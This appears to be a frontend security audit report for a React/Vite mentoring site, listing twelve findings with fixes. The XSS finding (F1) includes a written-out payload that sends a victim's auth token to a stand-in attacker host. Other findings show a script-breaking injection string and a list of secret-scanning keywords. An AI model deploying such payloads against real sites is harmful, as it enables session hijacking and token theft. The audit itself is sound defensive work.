# Atyant Frontend — Security Audit Report
**Branch:** `security/audit-hardening`
**Date:** 2026-06-24
**Scope:** `C:\Atyantfrontend` (Vite + React SPA)
**Phase:** 1 — Report Only. No code changed.

> **Scope note:** This repository is the React/Vite frontend only. The NestJS backend (Drizzle ORM, MongoDB Atlas, Razorpay webhook handling, JWT issuance, LiveKit token minting, Cloudinary upload signing) lives in a separate repo and **was not accessible for this audit**. Several findings below are architectural — confirmed exploitable from the frontend — but the full blast radius depends on backend behaviour. Backend audit is a required follow-up.

---

## Findings Table

| # | Severity | Title | File:Line |
|---|----------|-------|-----------|
| F1 | **CRITICAL** | XSS via unsanitized `dangerouslySetInnerHTML` (mentor.story) | `SeniorDetail.jsx:290` |
| F2 | **HIGH** | JWT stored in `localStorage` (XSS-accessible) | `AuthContext.jsx:47`, `api.js:13` |
| F3 | **HIGH** | JWT token leaked via URL query parameter (`?token=`) | `AuthContext.jsx:13-16` |
| F4 | **HIGH** | `.env` files committed to git — `.gitignore` missing `.env` pattern | `.gitignore`, `.env`, `.env.production` |
| F5 | **HIGH** | 4 `npm audit` HIGH CVEs in `vite`, `form-data`, `ws` | `package.json` |
| F6 | **MEDIUM** | Session ID generated with `Math.random()` (non-CSPRNG) | `AskAtyantPage.jsx:12` |
| F7 | **MEDIUM** | No Content-Security-Policy header | App-wide |
| F8 | **MEDIUM** | Dev Express server committed with wildcard CORS (`cors()`) | `server/server.js:6` |
| F9 | **MEDIUM** | `window.openBooking` global — callable by any injected script | `App.jsx:914` |
| F10 | **LOW** | JSON-LD `dangerouslySetInnerHTML` does not escape `</script>` sequences | `SEOHead.jsx:54-61` |
| F11 | **LOW** | `Admin.jsx` — unguarded admin UI, dead code but unrouted | `src/pages/Admin.jsx` |
| F12 | **LOW** | Backend rate-limiting unverifiable from frontend (AI/auth/OTP endpoints) | `api.js` (inferred) |

---

## Detailed Findings

---

### F1 — CRITICAL: Stored XSS via `dangerouslySetInnerHTML` on `mentor.story`

**File:** `src/components/clarity/SeniorDetail.jsx:290`

```jsx
<p dangerouslySetInnerHTML={{ __html: mentor.story }} />
```

**What's wrong:** `mentor.story` is fetched from the backend and rendered as raw HTML with zero sanitization. React's normal JSX rendering escapes HTML entities; `dangerouslySetInnerHTML` bypasses that entirely.

**Concrete exploit:**
1. Attacker registers as a mentor and submits a story containing: `<img src=x onerror="fetch('https://attacker.com/steal?t='+localStorage.getItem('atyant_token'))">`
2. Backend saves it verbatim. Any student who views the senior's profile card executes the payload.
3. Because the JWT is in `localStorage` (F2), `localStorage.getItem('atyant_token')` yields the victim's full auth token.
4. Attacker replays the token to impersonate the student, access saved sessions, trigger bookings, etc.
5. Attack is persistent — every future visitor of that mentor's profile is hit.

**Fix:** Replace raw HTML rendering with a sanitized version using `DOMPurify`:
```jsx
import DOMPurify from 'dompurify';
// ...
<p dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(mentor.story) }} />
```
Or — preferred — strip HTML entirely and render as plain text with `<p>{mentor.story}</p>` (if rich formatting isn't required).

---

### F2 — HIGH: JWT stored in `localStorage`

**Files:** `src/context/AuthContext.jsx:47,55`, `src/api.js:13`

```js
localStorage.setItem('atyant_token', data.token);  // AuthContext.jsx:47
return localStorage.getItem('atyant_token');         // api.js:13
```

**What's wrong:** Any JavaScript running on the page — including injected scripts from XSS (F1), compromised CDN assets, or browser extensions — can read `localStorage`. This makes the JWT trivially stealable if any XSS fires.

**Concrete exploit:** Combining with F1: attacker-injected `<img onerror>` reads `localStorage.getItem('atyant_token')` and exfiltrates it. With that token the attacker gets full session access.

**Fix (requires backend co-ordination):**
- Issue the JWT as an `httpOnly; Secure; SameSite=Strict` cookie from the backend.
- Remove `localStorage.setItem/getItem` for the token entirely.
- The `credentials: 'include'` is already set in `api.js:25`, so cookie-based auth would work transparently.
- Note: The backend currently also accepts Bearer tokens, so the migration can be phased.

---

### F3 — HIGH: JWT leaked via URL query parameter

**File:** `src/context/AuthContext.jsx:13-16`

```js
const urlToken = params.get('token');
if (urlToken) {
  localStorage.setItem('atyant_token', urlToken);
  // ...
}
```

**What's wrong:** After Google OAuth, the backend redirects to `/?token=<jwt>`. Tokens in URLs are logged in:
- Browser history (persists across sessions)
- Server-side access logs (if any analytics proxy sits in front)
- HTTP `Referer` headers — if the user clicks an external link on the page before the token is cleaned from the URL, the JWT goes to the destination server in the Referer header
- Third-party analytics (Umami captures URL path; if it captured query params historically, it has JWTs)

The current code does call `window.history.replaceState` to remove the token from the URL, but only _after_ the token is already in browser history.

**Fix:**
1. Implement the OAuth exchange as a server-side redirect to a POST form or use the Authorization Code flow with PKCE that stores state in a cookie, not the URL.
2. Short-term mitigation: move from `?token=` to a one-time code (`?code=`) that the frontend exchanges server-side for a short-lived session cookie.

---

### F4 — HIGH: `.env` files committed to git, `.gitignore` missing `.env` pattern

**Files:** `.gitignore`, `.env` (committed at commit `26d6a17`), `.env.production` (committed at commit `de5b58c`)

**Confirmed from git history:**
```
commit 26d6a17... "Add Auth/API, roadmap & sessions UI refactor"
+++ b/.env
@@ -0,0 +1 @@
+VITE_API_URL=http://localhost:5000

commit de5b58c... "fix: restore meet connection and add production API URL"
+++ b/.env.production
@@ -0,0 +1 @@
+VITE_API_URL=https://api.product.atyant.in
```

**Current state:** No actual secrets are in these committed files (only the public API base URL). However, the `.gitignore` pattern is:
```
*.local       ← covers .env.local, .env.development.local, etc.
```
It does NOT cover `.env`, `.env.production`, `.env.development`, `.env.staging`. If any developer adds `RAZORPAY_KEY_SECRET`, `JWT_SECRET`, or `MONGO_URI` to `.env` (as `VITE_API_URL` is already there as a template), it will be committed and pushed.

**Fix (two steps):**
1. Add to `.gitignore`:
   ```
   .env
   .env.*
   !.env.example
   ```
2. If the repo is public on GitHub, BFG Repo Cleaner or `git filter-repo` should purge the committed `.env` files from history even though they're currently benign — good hygiene before the repo grows.

---

### F5 — HIGH: 4 npm audit HIGH-severity CVEs

**File:** `package.json` (output of `npm audit`)

| Package | CVE | Severity | Impact | Fix |
|---------|-----|----------|--------|-----|
| `vite 8.0.0-8.0.15` | GHSA-v6wh-96g9-6wx3 | HIGH | NTLMv2 hash disclosure via UNC path on Windows dev server | `npm audit fix` |
| `vite 8.0.0-8.0.15` | GHSA-fx2h-pf6j-xcff | HIGH | `server.fs.deny` bypass on Windows alternate paths (allows reading `../` files) | `npm audit fix` |
| `form-data 4.0.0-4.0.5` | GHSA-hmw2-7cc7-3qxx | HIGH | CRLF injection via unescaped field names in multipart uploads | `npm audit fix` |
| `ws 8.0.0-8.20.1` | GHSA-96hv-2xvq-fx4p | HIGH | Memory exhaustion DoS from tiny WebSocket fragments | `npm audit fix` |

**Impact context:**
- The `vite` vulnerabilities affect the dev server, not the production build. Still a risk for developers on Windows.
- `form-data` CRLF injection is in how multipart requests are built. The `uploadFile` helper in `api.js:99-112` uses `FormData` (browser-native, not `form-data` package), so the direct risk may be indirect via a transitive dependency.
- `ws` affects the `socket.io-client` used in `ChatPage.jsx:146` — a malicious server could DoS the client browser tab.

**Fix:** `npm audit fix` resolves all 4. Verify nothing breaks after upgrading.

---

### F6 — MEDIUM: Session ID generated with `Math.random()` (non-CSPRNG)

**File:** `src/components/clarity/AskAtyantPage.jsx:12`

```js
function freshSid() {
  return "sess_" + Math.random().toString(36).slice(2) + Date.now().toString(36);
}
```

**What's wrong:** `Math.random()` is not a cryptographically secure pseudo-random number generator (CSPRNG). The session ID is used to store and retrieve AI conversation state server-side. An attacker who can observe one session ID (e.g., via logs, Referrer leakage) could potentially predict nearby IDs and read other users' AI chat sessions.

**Concrete exploit:** Low-probability but possible on high-volume deployments: attacker seeds `Math.random()` from a known timestamp window and brute-forces `getSession(sid)` to read another user's conversation (including any personal info shared with the AI).

**Fix:**
```js
function freshSid() {
  const arr = new Uint8Array(16);
  crypto.getRandomValues(arr);
  return 'sess_' + Array.from(arr, b => b.toString(16).padStart(2,'0')).join('');
}
```
`crypto.getRandomValues` is available in all modern browsers.

---

### F7 — MEDIUM: No Content-Security-Policy header

**Scope:** App-wide (verified: no CSP meta tag in `index.html`, no mention in `vercel.json`)

**What's wrong:** Without a CSP, the browser permits any inline script, any `eval()`, and any external resource origin. If F1 (XSS) fires, the attacker can load arbitrary scripts from any domain, exfiltrate data, hijack sessions, etc.

**Fix:** Add a `Content-Security-Policy` header in `vercel.json`:
```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' https://checkout.razorpay.com; connect-src 'self' https://api.product.atyant.in wss://api.product.atyant.in; img-src 'self' data: https://res.cloudinary.com https://ui-avatars.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; frame-src https://checkout.razorpay.com;"
        },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" }
      ]
    }
  ]
}
```
Note: The Razorpay checkout script and iframe require explicit allowlist entries above.

---

### F8 — MEDIUM: Dev Express server committed with wildcard CORS

**File:** `server/server.js:6`

```js
const app = express();
app.use(cors());  // ← no origin restriction
```

**What's wrong:** This is a dev stub committed to the repo. `cors()` with no options defaults to `Access-Control-Allow-Origin: *` — any origin can make cross-origin requests, including reading responses (for non-preflight requests). The only route is a fire-and-forget `/api/book-session` that logs `req.body` to stdout, but the pattern is dangerous if this file ever gets accidentally used as a real server.

**Fix:** Either delete this file (it's dead code), or lock it to trusted origins:
```js
app.use(cors({ origin: ['http://localhost:5173', 'https://atyant.in'] }));
```

---

### F9 — MEDIUM: `window.openBooking` global callable by any injected script

**File:** `src/App.jsx:914`

```js
window.openBooking = (target) => { /* opens booking modal */ };
```

**What's wrong:** Attaching functionality to `window` makes it callable by any JavaScript on the page — third-party analytics, browser extensions, or XSS payloads. An injected script could call `window.openBooking({ mentorId: "attacker_id" })` to pre-fill the booking modal with an attacker's profile and socially engineer the user into paying a fraudulent mentor.

**Fix:** Use a React context or event-emitter pattern scoped to the component tree instead of a window global. E.g., a custom `openBookingEvent` dispatched via `document.dispatchEvent` and handled only inside `App.jsx`, or a shared ref passed through context.

---

### F10 — LOW: JSON-LD `dangerouslySetInnerHTML` without `</script>` escaping

**File:** `src/components/SEOHead.jsx:59`

```jsx
<script type="application/ld+json"
  dangerouslySetInnerHTML={{ __html: JSON.stringify(s) }}
/>
```

**What's wrong:** `JSON.stringify` does NOT escape `<`, `>`, or `/` by default in JavaScript. If any user-supplied data flows into the schema object (e.g., `mentor.name = '</script><script>alert(1)</script>'`), the browser terminates the script tag early and executes the payload.

**Current risk:** Low, because the schema objects are constructed in `App.jsx` from backend data and don't appear to include raw user-typed fields directly. But it's a latent risk as the schema grows.

**Fix:**
```js
const safeJson = JSON.stringify(s).replace(/</g, '\\u003c').replace(/>/g, '\\u003e').replace(/&/g, '\\u0026');
// then: dangerouslySetInnerHTML={{ __html: safeJson }}
```

---

### F11 — LOW: `Admin.jsx` — Full admin UI, no auth guard, currently dead code

**File:** `src/pages/Admin.jsx:1593`

**What's wrong:** A full admin panel (sessions, bookings, coupons, testimonials, scheduling, FAQs) is implemented with no authentication or role check. It is currently **not routed** — it's not imported in `main.jsx` or `App.jsx` — so it's unreachable by users. However:
- If someone accidentally adds a route (`/admin`), it becomes publicly accessible to anyone.
- It contains hardcoded mock email addresses (`aryan@email.com`, `meera@email.com`, etc.) that look like real test data.
- All data is in-memory React state — no backend API calls — confirming it's a prototype that was never wired up.

**Fix:** Either delete the file or add a role guard at the top:
```jsx
const { user } = useAuth();
if (!user || user.role !== 'admin') return <Navigate to="/" />;
```
And connect it to real backend APIs. Do not add the route without the guard.

---

### F12 — LOW: Backend rate-limiting on AI, auth, and OTP endpoints — unverifiable from frontend

**Context:** The frontend calls:
- `POST /api/ai/atyant-chat` — Gemini/Claude API call per message (cost abuse risk)
- `POST /api/auth/login` — brute-force risk
- `POST /api/auth/forgot-password` + `/verify-reset-code` — OTP spray risk
- `POST /api/clarity/match` — vector search, moderate cost per call

**What's wrong:** Without per-IP or per-user rate limiting on these endpoints, a bot can:
- Drain Gemini/Claude API quota (financial impact — possibly thousands of rupees/hour)
- Brute-force passwords
- Spam OTPs to enumerate registered emails

Cannot confirm or deny from this repo alone — backend code required.

**Recommended limits (to verify/implement in NestJS backend):**
- `/api/ai/*`: 30 req/min per user, 5 req/min unauthenticated
- `/api/auth/login`: 10 req/min per IP
- `/api/auth/forgot-password`: 3 req/10-min per IP + per email
- `/api/clarity/match`: 20 req/min per user

---

## Payments — Razorpay Assessment

The frontend Razorpay flow was audited carefully. **The current architecture is correct:**

- Order is created server-side via `POST /api/payments/order` — price comes from `serviceId`, never from the client. ✅
- The `razorpay_signature`, `razorpay_order_id`, and `razorpay_payment_id` are sent to `POST /api/payments/verify` for server-side HMAC verification. ✅
- The Razorpay `key_id` (public key, safe to expose) is returned from the server. `key_secret` does not appear anywhere in the frontend codebase. ✅
- Same pattern for subscriptions (`subscriptionCheckout.js`). ✅

**Cannot confirm from frontend:** Whether the backend actually does HMAC verification using `razorpay_webhook_secret` or `key_secret`, and whether webhook replay is guarded. This must be audited in the NestJS backend.

---

## Auth — LiveKit Assessment

`MeetPage.jsx` fetches the LiveKit token from `POST /api/livekit/join/:sessionId` with the user's Bearer JWT. The LiveKit API secret does not appear anywhere in the frontend. Token is used to join a room — scoping of grants must be verified in the backend. ✅ (frontend clean)

---

## Secrets & Config — Git History Assessment

Full `git log -p` scan across all commits for:
- `rzp_live`, `rzp_test`, `key_secret`, `cloudinary.*secret`, `mongo.*atlas`, `JWT_SECRET`, `LIVEKIT_SECRET`, `GEMINI`, `ANTHROPIC`

**Result: No actual secrets found in git history.** Only `.env` files with public API URL were committed. ✅

---

## Fix Order (Priority Stack for Phase 2)

Fix these in order — each reduces blast radius for the ones after it.

| Priority | Finding | Why First |
|----------|---------|-----------|
| 1 | **F1** — XSS via `dangerouslySetInnerHTML` | Enables token theft; everything else is downstream |
| 2 | **F4** — Add `.env` to `.gitignore` | Prevent future accidental secret commits; low effort, immediate |
| 3 | **F5** — `npm audit fix` | 1-command fix, eliminates 4 HIGH CVEs |
| 4 | **F7** — Add CSP + security headers to `vercel.json` | Kills XSS impact even if F1 slips through again |
| 5 | **F3** — Remove token from URL (`?token=`) | Coordinate with backend; needs OAuth flow change |
| 6 | **F2** — Migrate JWT to httpOnly cookie | Requires backend change; phased migration |
| 7 | **F6** — Replace `Math.random()` with `crypto.getRandomValues` | 2-line fix |
| 8 | **F8** — Lock CORS or delete `server/server.js` | 1-line fix |
| 9 | **F9** — Remove `window.openBooking` global | Refactor to context/event pattern |
| 10 | **F10** — Escape `</script>` in JSON-LD | 1-line fix |
| 11 | **F11** — Add auth guard to Admin or delete it | Gate on backend wiring decision |
| 12 | **F12** — Audit + enforce rate limits in NestJS backend | Backend work, separate effort |

---

*This report covers the frontend repo only. A backend repo audit (NestJS, Drizzle, webhook handlers, RBAC middleware, Cloudinary upload presets, n8n workflows) is required for a complete picture.*
